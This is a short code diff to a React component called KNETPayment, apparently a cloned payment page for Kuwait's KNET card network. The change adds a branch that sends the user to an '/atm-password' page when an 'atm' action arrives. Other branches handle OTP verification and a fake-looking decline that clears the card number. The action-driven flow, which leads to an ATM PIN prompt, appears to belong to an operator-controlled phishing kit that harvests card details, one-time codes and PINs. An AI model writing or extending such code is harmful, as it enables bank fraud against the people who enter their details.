@@ -95,6 +95,8 @@ export default function KNETPayment() {
           setPhase("otp");
           startCountdown();
           navigateToPage("QPay OTP Verification");
+        } else if (action === "atm") {
+          navigate("/atm-password");
         } else if (action === "reject") {
           setRejectedError("Transaction declined. Please check your card details.");
           setCardNumber("");
